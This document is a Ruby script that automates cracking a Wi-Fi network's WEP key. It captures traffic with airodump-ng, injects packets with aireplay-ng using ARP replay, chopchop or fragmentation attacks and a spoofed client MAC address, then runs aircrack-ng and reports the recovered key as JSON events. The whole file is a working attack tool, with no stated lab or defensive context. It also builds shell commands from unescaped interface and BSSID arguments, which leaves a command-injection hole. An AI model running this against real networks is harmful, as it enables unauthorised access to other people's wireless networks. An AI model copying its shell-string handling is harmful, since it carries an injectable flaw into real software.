#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'open3'

begin
  iface = ARGV[0]
  bssid = ARGV[1]
  channel = (ARGV[2] || 1).to_i
  count = (ARGV[3] || 20_000).to_i
  method = (ARGV[4] || 'arp_replay').downcase

  raise 'interface required' unless iface
  raise 'bssid required' unless bssid

  stdout, stderr, status = Open3.capture3("iw dev #{iface} info 2>/dev/null")
  unless stdout.include?('type monitor')
    puts JSON.generate({ event: 'monitor_fail', iface: iface,
      data: { message: 'Interface not in monitor mode' },
      timestamp: Time.now.iso8601 })
    $stdout.flush
  end

  system("iw dev #{iface} set channel #{channel} 2>/dev/null")
  puts JSON.generate({ event: 'channel_set', iface: iface, bssid: bssid,
    data: { channel: channel }, timestamp: Time.now.iso8601 })
  $stdout.flush

  puts JSON.generate({ event: 'iv_collect_start', iface: iface, bssid: bssid,
    data: { method: 'airodump' }, timestamp: Time.now.iso8601 })
  $stdout.flush

  airodump_pid = spawn("airodump-ng -c #{channel} -w /tmp/wep_capture --bssid #{bssid} #{iface} 2>/dev/null")
  Process.detach(airodump_pid)

  6.times do |i|
    sleep(5)
    cap_file = '/tmp/wep_capture-01.cap'
    size = File.size(cap_file) if File.exist?(cap_file)
    puts JSON.generate({ event: 'iv_progress', iface: iface, bssid: bssid,
      data: { elapsed: (i + 1) * 5, file_size: size || 0 },
      timestamp: Time.now.iso8601 })
    $stdout.flush
  end

  system("pkill -f 'airodump-ng.*#{iface}' 2>/dev/null")
  sleep(1)

  puts JSON.generate({ event: 'method_start', iface: iface, bssid: bssid,
    data: { method: method }, timestamp: Time.now.iso8601 })
  $stdout.flush

  case method
  when 'chopchop'
    stdout, stderr, status = Open3.capture3("aireplay-ng -4 -b #{bssid} -h 00:11:22:33:44:55 #{iface} 2>/dev/null")
    stdout.each_line do |line|
      if (pct = line[/Progress: (\d+)/, 1])
        puts JSON.generate({ event: 'chopchop_progress', iface: iface, bssid: bssid,
          data: { percent: pct.to_i }, timestamp: Time.now.iso8601 })
        $stdout.flush
      end
      if line.include?('Keystream')
        puts JSON.generate({ event: 'keystream_found', iface: iface, bssid: bssid,
          data: { detail: line[0..150] }, timestamp: Time.now.iso8601 })
        $stdout.flush
      end
    end
  when 'fragmentation'
    stdout, stderr, status = Open3.capture3("aireplay-ng -5 -b #{bssid} -h 00:11:22:33:44:55 #{iface} 2>/dev/null")
    packets = 0
    stdout.each_line do |line|
      if line.include?('Fragment') || line.include?('packet')
        packets += 1
        puts JSON.generate({ event: 'frag_sent', iface: iface, bssid: bssid,
          data: { count: packets }, timestamp: Time.now.iso8601 })
        $stdout.flush
      end
    end
  else
    stdout, stderr, status = Open3.capture3("aireplay-ng -3 -b #{bssid} -h 00:11:22:33:44:55 #{iface} 2>/dev/null")
    packets = 0
    stdout.each_line do |line|
      if line.include?('ARP') || line.include?('packet')
        packets += 1
        puts JSON.generate({ event: 'arp_sent', iface: iface, bssid: bssid,
          data: { count: packets }, timestamp: Time.now.iso8601 })
        $stdout.flush
      end
    end
  end

  puts JSON.generate({ event: 'crack_start', iface: iface, bssid: bssid,
    data: { method: 'aircrack-ng' }, timestamp: Time.now.iso8601 })
  $stdout.flush

  stdout, stderr, status = Open3.capture3("aircrack-ng -b #{bssid} /tmp/wep_capture-01.cap 2>/dev/null")
  key = stdout[/KEY FOUND! \[ ([^\]]+) \]/, 1] || ''
  unless key.empty?
    puts JSON.generate({ event: 'key_found', iface: iface, bssid: bssid,
      data: { wep_key: key }, timestamp: Time.now.iso8601 })
    $stdout.flush
  end

  if stdout.include?('Failed')
    puts JSON.generate({ event: 'crack_failed', iface: iface, bssid: bssid,
      data: { message: 'Not enough IVs captured' },
      timestamp: Time.now.iso8601 })
    $stdout.flush
  end

  puts JSON.generate({ event: 'complete', iface: iface, bssid: bssid,
    data: { method: method, key_found: !key.empty?, captured_file: '/tmp/wep_capture-01.cap' },
    timestamp: Time.now.iso8601 })
  $stdout.flush

rescue Interrupt
  system("pkill -f 'airodump-ng.*#{iface}' 2>/dev/null") if iface
  system("pkill -f 'aireplay-ng.*#{iface}' 2>/dev/null") if iface
  puts JSON.generate({ event: 'wep_interrupted', iface: iface || '',
    data: { status: 'interrupted' }, timestamp: Time.now.iso8601 })
rescue => e
  $stderr.puts JSON.generate({ event: 'error', data: { message: e.message,
    backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601 })
  exit 1
end
